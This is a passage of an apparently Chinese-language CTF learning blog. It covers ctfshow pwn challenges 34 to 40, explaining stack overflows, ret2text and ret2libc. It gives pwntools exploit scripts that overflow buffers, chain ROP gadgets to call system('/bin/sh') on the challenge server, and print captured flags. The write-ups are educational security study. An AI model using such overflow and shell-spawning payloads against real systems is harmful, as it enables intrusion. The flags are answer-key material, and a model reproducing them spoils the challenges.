+<h5 id="2-ret2libc-的典型步骤"><a href="#2-ret2libc-的典型步骤" class="headerlink" title="2. ret2libc 的典型步骤"></a><strong>2. ret2libc 的典型步骤</strong></h5><p>以下是一个典型的 <code>ret2libc</code> 利用过程：</p>
+<h6 id="（1）确定目标函数"><a href="#（1）确定目标函数" class="headerlink" title="（1）确定目标函数"></a><strong>（1）确定目标函数</strong></h6><ul>
+<li>常用的目标函数是 <code>system</code>，因为它可以执行任意命令。</li>
+<li>需要知道 <code>system</code> 函数在内存中的地址（通过 <code>libc</code> 的基地址和偏移计算）。</li>
+</ul>
+<h6 id="（2）获取-bin-sh-的地址"><a href="#（2）获取-bin-sh-的地址" class="headerlink" title="（2）获取 **/bin/sh** 的地址"></a><strong>（2）获取 <strong><code>**/bin/sh**</code></strong> 的地址</strong></h6><ul>
+<li><code>system</code> 函数需要一个字符串参数（如 <code>/bin/sh</code>），用于启动 Shell。</li>
+<li>如果程序中存在 <code>/bin/sh</code> 字符串，可以直接使用其地址；否则需要通过其他方式（如写入内存）获取。</li>
+</ul>
+<h6 id="（3）构造-payload"><a href="#（3）构造-payload" class="headerlink" title="（3）构造 payload"></a><strong>（3）构造 payload</strong></h6><p>通过栈溢出覆盖返回地址，构造如下 payload：</p>
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| 填充数据 | system 地址 | 返回地址 | 参数地址 |</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>填充数据</strong>：覆盖栈空间，直到返回地址。</li>
+<li><strong>system 地址</strong>：覆盖返回地址为 <code>system</code> 函数的地址。</li>
+<li><strong>返回地址</strong>：<code>system</code> 函数执行后的返回地址（通常可以设置为 <code>exit</code> 函数地址或任意值）。</li>
+<li><strong>参数地址</strong>：<code>/bin/sh</code> 字符串的地址。</li>
+</ul>
+<hr>
+<h5 id="3-示例：ret2libc-利用"><a href="#3-示例：ret2libc-利用" class="headerlink" title="3. 示例：ret2libc 利用"></a><strong>3. 示例：ret2libc 利用</strong></h5><p>假设：</p>
+<ul>
+<li><code>system</code> 函数地址：<code>0x7ffff7e4c3a0</code></li>
+<li><code>/bin/sh</code> 字符串地址：<code>0x7ffff7f7d5bd</code></li>
+<li>填充长度：100 字节</li>
+</ul>
+<p>构造 payload：</p>
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b&quot;A&quot; * 100               # 填充数据</span><br><span class="line">payload += p64(0x7ffff7e4c3a0)     # system 地址</span><br><span class="line">payload += p64(0xdeadbeef)         # 返回地址（任意值）</span><br><span class="line">payload += p64(0x7ffff7f7d5bd)     # /bin/sh 地址</span><br></pre></td></tr></table></figure>
+
+<p>发送 payload 后，程序会跳转到 <code>system</code> 函数并执行 <code>/bin/sh</code>，从而启动 Shell。</p>
+<hr>
+<h5 id="4-ret2libc-的变种"><a href="#4-ret2libc-的变种" class="headerlink" title="4. ret2libc 的变种"></a><strong>4. ret2libc 的变种</strong></h5><ul>
+<li><strong>ret2libc + ROP</strong>：当无法直接调用 <code>system</code> 时，可以通过 ROP（Return-Oriented Programming）技术构造链式调用。</li>
+<li><strong>ret2libc + 动态地址</strong>：如果 <code>libc</code> 的地址是随机的（启用了 ASLR），需要通过信息泄露（如格式化字符串漏洞）获取 <code>libc</code> 的基地址。</li>
+<li><strong>ret2libc + 参数构造</strong>：如果无法直接获取 <code>/bin/sh</code> 的地址，可以通过写入内存的方式构造参数。</li>
+</ul>
+<hr>
+<h5 id="5-ret2libc-的防御"><a href="#5-ret2libc-的防御" class="headerlink" title="5. ret2libc 的防御"></a><strong>5. ret2libc 的防御</strong></h5><ul>
+<li><strong>启用 ASLR</strong>：随机化 <code>libc</code> 的基地址，增加利用难度。</li>
+<li><strong>启用栈保护</strong>：如 <code>canary</code>，防止栈溢出。</li>
+<li><strong>减少敏感函数</strong>：避免使用 <code>system</code> 等危险函数。</li>
+</ul>
+<hr>
+<h5 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a><strong>6. 总结</strong></h5><p><code>ret2libc</code> 是一种绕过 NX 保护的漏洞利用技术，通过调用 <code>libc</code> 中的函数（如 <code>system</code>）实现 Shell 的获取。其核心步骤包括：</p>
+<ol>
+<li>确定目标函数地址（如 <code>system</code>）。</li>
+<li>获取参数地址（如 <code>/bin/sh</code>）。</li>
+<li>构造 payload 覆盖返回地址并传递参数。</li>
+</ol>
+<h4 id="wp-5"><a href="#wp-5" class="headerlink" title="wp"></a>wp</h4><p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1741865001028-27fff504-ed28-4e0f-ba2b-8540ef48e165.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>HINT：开启NX保护，或许可以试试ret2libc</p>
+<p>用ida反编译，看到：</p>
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t ctfshow()</span><br><span class="line">&#123;</span><br><span class="line">  char buf[132]; // [esp+0h] [ebp-88h] BYREF</span><br><span class="line"></span><br><span class="line">  return read(0, buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的buf读入132个字节，然而后面read函数读取数据之后将读取的数据放入缓冲区buf，但是最大可读的字节数为256字节（0x100u），也就是说可能会造成栈溢出</p>
+<p>有点做不动了，知识点有点脱节，先看pwn相关的书去了，等一小段时间我再回来补wp</p>
+<h2 id="pwn35"><a href="#pwn35" class="headerlink" title="pwn35"></a>pwn35</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758085049193-2f3e9e83-d880-4d72-92c7-3426b3d8b7bc.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>观察一下函数<code>ctfshow</code>，<img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758085363454-9dc2c141-e441-42a6-9d57-da6f7dd70369.png" referrerpolicy="no-referrer" loading="lazy" decoding="async">这里的dest[104]</p>
+<p>所以应该是利用栈溢出</p>
+<p>ai再搜了一下<code>./pwnme *****</code>的意思是<img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758087911394-e1a46ef5-0200-434a-b37a-6304b6b4667c.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>所以向argv输入超过140个字节</p>
+<blockquote>
+<p><code>ssh ctfshow@pwn.challenge.ctf.show -p28269</code>还懵了一下不知道怎么用，结果扔到ubuntu就行了，同时也注意到了<code>cat ./pwnme</code>和<code>./pwnme</code>的呈现内容有差别（前者是乱的）</p>
+<p>原因如此<img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758085319682-a52076d1-d637-4c01-9277-4179f6be07ab.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+</blockquote>
+<p>直接打开pwnme</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758085146039-f72ba547-d716-4643-9ebb-ad4a889b6f86.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>输入大于104字节的内容之后</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758095066384-552af20f-a952-4175-a022-4b56f1b9d020.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p><code>ctfshow{a9ac2a16-c544-47f3-a6af-b631f8393e14}</code></p>
+<h2 id="pwn36"><a href="#pwn36" class="headerlink" title="pwn36"></a>pwn36</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758095188265-908e2a05-7452-4499-8773-88b49185bf04.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758101473632-705c5aba-322a-44d3-834c-6a53d584bbf2.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758101478521-dd7c2abc-2d50-4a93-ac7c-dd3e1863531a.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p><code>[esp+0h] [ebp-28h]</code>压栈，留出36字节空位给数组s，我看别人写wp中写返回地址会在ebp上面，占4字节（因为这是32位的文件，64位文件是8字节）<img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758104595354-3eb8bc6a-98fd-4c2d-8b9e-fd494a8b7042.png" referrerpolicy="no-referrer" loading="lazy" decoding="async">，所以利用栈溢出，填满s（36）+4（覆盖4字节返回地址）&#x3D;40字节，最后返回到gat_flag函数的地址</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758101490851-5fc28a2e-6678-487b-ad85-89833e3e154e.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p><code>gdb ./pwn</code>动态调试，找到get_flag函数的起始地址：<img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758105173073-fcf60f4e-12c5-4e96-abfc-85cfe25965cb.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>（反正人家wp是这么写的，其实不如用ida直接看）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758101466504-e9c85ed1-8586-4340-bb9b-1f30eda65c7a.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>其实也可以直接通过空格转换成文本视图找到函数地址：<img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758104932072-34d640bc-c258-4517-bf21-1de8a2ee55dc.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>所以payload如下：</p>
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, 28107)</span><br><span class="line"></span><br><span class="line">offset=0x28+0x4</span><br><span class="line">getflag_addr=0x8048586</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*offset + p32(getflag_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>加了<code>p.interactive()</code>之后pycharm可以直接交互了，不用在Ubuntu上跑了</p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758106710814-c57a9908-8ef1-445d-9774-f32860158cb1.png" referrerpolicy="no-referrer" loading="lazy" decoding="async">要写成<img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758106726449-5a6e141c-6141-497d-ba68-b4962ecc28ea.png" referrerpolicy="no-referrer" loading="lazy" decoding="async">原因是<img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758106767942-73d2d5b2-8b5f-4b7f-a070-a260098cb83d.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>运行paylaod即可：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758106803841-05ef690d-680c-467e-abf6-cc5182376953.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p><code>ctfshow{96a92129-dbab-4582-962e-3c5c3349c739}</code></p>
+<h2 id="pwn37"><a href="#pwn37" class="headerlink" title="pwn37"></a>pwn37</h2><figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  init(&amp;argc);</span><br><span class="line">  logo();</span><br><span class="line">  puts(&quot;Just very easy ret2text&amp;&amp;32bit&quot;);</span><br><span class="line">  ctfshow();</span><br><span class="line">  puts(&quot;\nExit&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t ctfshow()</span><br><span class="line">&#123;</span><br><span class="line">  char buf[14]; // [esp+6h] [ebp-12h] BYREF</span><br><span class="line"></span><br><span class="line">  return read(0, buf, 0x32u);#只有14字节读0x32，栈爆爆爆</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758109283218-a6f6d9e8-f33d-4e91-9341-9532d5ff8dc1.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>所以套路跟pwn36应该是一样的</p>
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, 28255)</span><br><span class="line"></span><br><span class="line">offset=0x12+0x4</span><br><span class="line">getflag_addr=0x8048521</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*offset + p32(getflag_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758109207910-6f2bc444-5839-420d-948a-9ecb6e53325a.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758109212963-b6ac6afd-5dee-4ade-a185-a74263e4aecc.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>可以可以（因为居然没看提示没问ai就做出来了嘻嘻）：</p>
+<p><code>ctfshow{1706f0f4-76d3-4eec-a2e1-7589a304dae1}</code></p>
+<h2 id="pwn38"><a href="#pwn38" class="headerlink" title="pwn38"></a>pwn38</h2><blockquote>
+<p>提示：<em>64位的 system(“&#x2F;bin&#x2F;sh”) 后门函数给你</em></p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758109379444-b39b4bd8-960a-49dc-849f-5843ff632e01.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>64位的</p>
+<p>所以ida64：</p>
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  puts(&quot;    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           &quot;);</span><br><span class="line">  puts(asc_400890);</span><br><span class="line">  puts(</span><br><span class="line">    &quot; ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██&quot;);</span><br><span class="line">  puts(asc_4009A0);</span><br><span class="line">  puts(asc_400A30);</span><br><span class="line">  puts(asc_400AB8);</span><br><span class="line">  puts(</span><br><span class="line">    &quot;    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  &quot;);</span><br><span class="line">  puts(&quot;    * *************************************                           &quot;);</span><br><span class="line">  puts(aClassifyCtfsho);</span><br><span class="line">  puts(&quot;    * Type  : Stack_Overflow                                          &quot;);</span><br><span class="line">  puts(&quot;    * Site  : https://ctf.show/                                       &quot;);</span><br><span class="line">  puts(&quot;    * Hint  : It has system and &#x27;/bin/sh&#x27;.There is a backdoor function&quot;);</span><br><span class="line">  puts(&quot;    * *************************************                           &quot;);</span><br><span class="line">  puts(&quot;Just easy ret2text&amp;&amp;64bit&quot;);</span><br><span class="line">  ctfshow();</span><br><span class="line">  puts(&quot;\nExit&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t ctfshow()</span><br><span class="line">&#123;</span><br><span class="line">  char buf[10]; // [rsp+6h] [rbp-Ah] BYREF</span><br><span class="line"></span><br><span class="line">  return read(0, buf, 0x32uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以payload的p32换成p64，同时64位程序涉及到一个“栈对齐”的概念：（两个解释都行）</p>
+<blockquote>
+<p>ai解释</p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758111276464-62f531b6-644b-4401-960f-4c1f17690de3.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<blockquote>
+<p>别人wp中解释</p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758112066000-762f7d6d-d227-4a11-b02e-51a6ede4a01e.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758111570196-d67ef7af-910d-4356-94bb-bb5a042a8479.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, 28306)</span><br><span class="line"></span><br><span class="line">offset=0xA+0x8</span><br><span class="line">getflag_addr=0x400657</span><br><span class="line">gflea_addr=0x40065B		#这里也可以是gfretn的地址0x40066C</span><br><span class="line">payload=b&#x27;a&#x27;*offset + p64(gflea_addr) + p64(getflag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>剩余流程相同</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758112008930-ff7d1d22-7c68-4b47-8f33-ebb5445ba549.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p><code>ctfshow{b6d70d92-c3e5-45b5-b31c-c26226c47fec}</code></p>
+<h2 id="pwn39"><a href="#pwn39" class="headerlink" title="pwn39"></a>pwn39</h2><blockquote>
+<p>32位的 system(); “&#x2F;bin&#x2F;sh”</p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758112323302-bcee2b93-8ab3-4c05-88fc-430777f60e85.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 2, 0);</span><br><span class="line">  puts(&quot;    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           &quot;);</span><br><span class="line">  puts(asc_80487E0);</span><br><span class="line">  puts(</span><br><span class="line">    &quot; ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██&quot;);</span><br><span class="line">  puts(asc_80488E8);</span><br><span class="line">  puts(asc_8048978);</span><br><span class="line">  puts(asc_80489FC);</span><br><span class="line">  puts(</span><br><span class="line">    &quot;    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  &quot;);</span><br><span class="line">  puts(&quot;    * *************************************                           &quot;);</span><br><span class="line">  puts(aClassifyCtfsho);</span><br><span class="line">  puts(&quot;    * Type  : Stack_Overflow                                          &quot;);</span><br><span class="line">  puts(&quot;    * Site  : https://ctf.show/                                       &quot;);</span><br><span class="line">  puts(&quot;    * Hint  : It has system and &#x27;/bin/sh&#x27;,but they don&#x27;t work together&quot;);</span><br><span class="line">  puts(&quot;    * *************************************                           &quot;);</span><br><span class="line">  puts(&quot;Just easy ret2text&amp;&amp;32bit&quot;);</span><br><span class="line">  ctfshow(&amp;argc);</span><br><span class="line">  puts(&quot;\nExit&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t ctfshow()</span><br><span class="line">&#123;</span><br><span class="line">  char buf[14]; // [esp+6h] [ebp-12h] BYREF</span><br><span class="line"></span><br><span class="line">  return read(0, buf, 0x32u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758163778713-47fd54c2-cc8b-4387-b585-69135a07f479.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<blockquote>
+<p>我勒个移花接木啊。。</p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758182388708-14c14a73-ccc8-45a9-969d-7460255e7ab1.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758182671825-64d08b49-b09f-413a-8aaa-3e2c11b17dd6.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>在这种没有现成的system(&#x2F;bin&#x2F;sh)的情况下需要先跳转到system函数处（plt段地址），添加返回地址，指向&#x2F;bin&#x2F;sh字段，所以payload如下：<img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758182808322-0a45701e-13d9-43e1-9231-5e12a1acf34b.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758182822782-9d4a4413-6ee1-4f34-8d76-b0b0418654c6.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, 28299)</span><br><span class="line"></span><br><span class="line">offset=0x12+0x4</span><br><span class="line">binsh_addr=0x8048750</span><br><span class="line">system_addr=0x80483a0</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*offset + p32(system_addr) + p32(0) +p32(binsh_addr)</span><br><span class="line">#p32(0)我的理解是地址占位符</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758182870601-e4ad182d-783d-4661-8e0b-a11381c4ab8e.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p><code>ctfshow{6541a8ef-a952-4f05-bac4-73d16021d899}</code></p>
+<h2 id="pwn40"><a href="#pwn40" class="headerlink" title="pwn40"></a>pwn40</h2><p>跟pwn37-pwn38是一样的，涉及到64位elf堆栈平衡：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/hu_c_t_f/article/details/131902515">关于pwn64位amd构造payload时的堆栈平衡问题以及32位与64位构造payload的区别与注意事项_64位 pwn 栈平衡-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/15996874.html">关于ubuntu18版本以上调用64位程序中的system函数的栈对齐问题 - ZikH26 - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52635170/article/details/135245163?ops_request_misc=&request_id=&biz_id=102&utm_term=CTFshow-pwn%E5%85%A5%E9%97%A8-pwn39&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-135245163.142%5Ev102%5Epc_search_result_base8">CTFshow-pwn入门-栈溢出pwn39-pwn40_ctfshow pwn39-CSDN博客</a></p>
+<p>堆栈平衡原理：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758346429952-a4b42777-3d87-4552-b35f-d36ad98228e3.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>只有pop\ret\push等等会出现压栈、出栈等出现寄存器地址变化的操作变化的。</p>
+<p>这里对比一下，pwn38中直接到backdoor函数可以出结果，pwn40需要把&#x2F;bin&#x2F;sh传到system函数中（“&#x2F;bin&#x2F;sh”的地址应该是data层的，而<strong>不是</strong>函数中间的<code>40065B</code><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758353191297-109dee64-323c-4ffa-bd29-ee16119a4e17.png" referrerpolicy="no-referrer" loading="lazy" decoding="async">）。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758347643380-63132c62-22ee-4cb5-854e-d434a1f7f0ab.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<blockquote>
+<p>pwn38</p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758347668788-6195c046-a8a5-4b3b-b33d-9c9d450d82d3.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<blockquote>
+<p>pwn40</p>
+</blockquote>
+<p>这里是用rdi寄存器传递“&#x2F;bin&#x2F;sh”，所以要获取pop rdi指令的地址：</p>
+<p><code>ROPgadget --binary pwn --only &quot;pop|ret&quot;</code>（因为后面也需要ret指令来做到堆栈平衡，所以一起拿了）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758353550390-01e58cb5-9e88-4397-b50c-2270b6418002.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, 28178)</span><br><span class="line"></span><br><span class="line">offset=0xA+0x8</span><br><span class="line">pop_rdi_addr=0x4007e3</span><br><span class="line">#用rdi传参，需要传到rdi寄存器中</span><br><span class="line">binsh_addr=0x400808</span><br><span class="line">system_addr=0x400520</span><br><span class="line">ret_addr=0x4004fe</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*offset + p64(pop_rdi_addr) +p64(binsh_addr) + p64(ret_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1758353031507-b03a18f2-7091-431f-a8d4-302daf226fdb.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
